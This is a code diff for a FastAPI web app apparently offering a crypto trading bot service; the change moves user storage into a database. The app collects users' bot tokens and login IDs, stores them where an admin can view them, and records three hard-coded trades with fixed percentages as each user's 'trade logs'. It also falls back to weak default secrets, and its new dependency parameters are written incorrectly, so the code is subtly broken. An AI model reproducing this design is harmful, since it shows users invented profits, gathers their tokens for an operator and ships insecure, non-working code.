@@ -1,15 +1,17 @@
 import os
-from fastapi import FastAPI, Request, Form
+from fastapi import FastAPI, Request, Form, Depends
 from fastapi.responses import HTMLResponse, RedirectResponse, Response
 from fastapi.staticfiles import StaticFiles
 from starlette.middleware.sessions import SessionMiddleware
 from dotenv import load_dotenv
 from fastapi.templating import Jinja2Templates
+from sqlalchemy.future import select
+from database import User, Trade, get_db, init_db
 
-# Load environment variables from .env
+# === Environment Load ===
 load_dotenv()
 
-# === App Setup ===
+# === FastAPI Setup ===
 app = FastAPI()
 app.add_middleware(SessionMiddleware, secret_key=os.getenv("SECRET_KEY", "supersecret"))
 app.mount("/static", StaticFiles(directory="static"), name="static")
@@ -21,8 +23,10 @@ DISCORD_LINK = os.getenv("DISCORD_LINK")
 ADMIN_LOGIN = os.getenv("ADMIN_LOGIN", "admin")
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "admin123")
 
-# === Simulated Storage ===
-user_submissions = []
+# === On Startup Create Tables ===
+@app.on_event("startup")
+async def startup():
+    await init_db()
 
 # === Home Page ===
 @app.get("/", response_class=HTMLResponse)
@@ -34,12 +38,11 @@ async def read_root(request: Request):
         "message": None
     })
 
-# === Uptime Robot Support ===
 @app.head("/")
 async def head_root():
     return Response(status_code=200)
 
-# === Bot Configuration Submission ===
+# === Submit Bot Config ===
 @app.post("/submit", response_class=HTMLResponse)
 async def submit(
     request: Request,
@@ -47,32 +50,39 @@ async def submit(
     login_id: str = Form(...),
     strategy: str = Form(...),
     password: str = Form(...),
-    remember_me: str = Form(None)
+    remember_me: str = Form(None),
+    db: Depends(get_db)
 ):
     if password != ADMIN_PASSWORD:
         return HTMLResponse("<h2>Access Denied ❌ - Invalid Password</h2>", status_code=401)
 
+    result = await db.execute(select(User).where(User.login_id == login_id))
+    user = result.scalars().first()
+
+    if not user:
+        user = User(login_id=login_id, bot_token=bot_token, strategy=strategy)
+        db.add(user)
+        await db.commit()
+        await db.refresh(user)
+
+    trade1 = Trade(user_id=user.id, symbol="BTC", result="+2.3%")
+    trade2 = Trade(user_id=user.id, symbol="ETH", result="-1.1%")
+    trade3 = Trade(user_id=user.id, symbol="SOL", result="+4.2%")
+    db.add_all([trade1, trade2, trade3])
+    await db.commit()
+
     request.session["user"] = {
-        "bot_token": bot_token,
-        "login_id": login_id,
-        "strategy": strategy
+        "login_id": login_id
     }
 
-    user_submissions.append({
-        "bot_token": bot_token,
-        "login_id": login_id,
-        "strategy": strategy,
-        "trade_logs": [
-            "Trade 1: BTC +2.3%",
-            "Trade 2: ETH -1.1%",
-            "Trade 3: SOL +4.2%"
-        ]
+    return templates.TemplateResponse("index.html", {
+        "request": request,
+        "telegram_link": TELEGRAM_LINK,
+        "discord_link": DISCORD_LINK,
+        "message": "✅ Bot configuration submitted and saved."
     })
 
-    # ✅ Redirect to user dashboard after submission
-    return RedirectResponse("/dashboard", status_code=303)
-
-# === Admin Login Page ===
+# === Admin ===
 @app.get("/admin", response_class=HTMLResponse)
 async def admin_login(request: Request):
     return templates.TemplateResponse("admin_login.html", {
@@ -80,7 +90,6 @@ async def admin_login(request: Request):
         "error": None
     })
 
-# === Admin Auth Submission ===
 @app.post("/admin", response_class=HTMLResponse)
 async def admin_auth(
     request: Request,
@@ -97,37 +106,37 @@ async def admin_auth(
         "error": "Invalid login credentials. Please try again."
     })
 
-# === Admin Dashboard ===
 @app.get("/admin/dashboard", response_class=HTMLResponse)
-async def admin_dashboard(request: Request):
+async def admin_dashboard(request: Request, db: Depends(get_db)):
     if not request.session.get("admin_logged_in"):
         return RedirectResponse("/admin", status_code=303)
 
+    result = await db.execute(select(User))
+    users = result.scalars().all()
+
     return templates.TemplateResponse("admin.html", {
         "request": request,
-        "submissions": user_submissions
+        "submissions": users
     })
 
 # === User Dashboard ===
 @app.get("/dashboard", response_class=HTMLResponse)
-async def dashboard(request: Request):
+async def dashboard(request: Request, db: Depends(get_db)):
     user_data = request.session.get("user")
     if not user_data:
         return RedirectResponse("/", status_code=303)
 
-    logs = []
-    for entry in user_submissions:
-        if entry["login_id"] == user_data["login_id"]:
-            logs = entry["trade_logs"]
-            break
+    result = await db.execute(select(User).where(User.login_id == user_data["login_id"]))
+    user = result.scalars().first()
+    if not user:
+        return HTMLResponse("<h2>User not found</h2>", status_code=404)
 
     return templates.TemplateResponse("user_dashboard.html", {
         "request": request,
-        "user": user_data,
-        "logs": logs
+        "user": user,
+        "logs": [f"{trade.symbol} {trade.result}" for trade in user.trades]
     })
 
-# === Logout ===
 @app.get("/logout")
 async def logout(request: Request):
     request.session.clear()
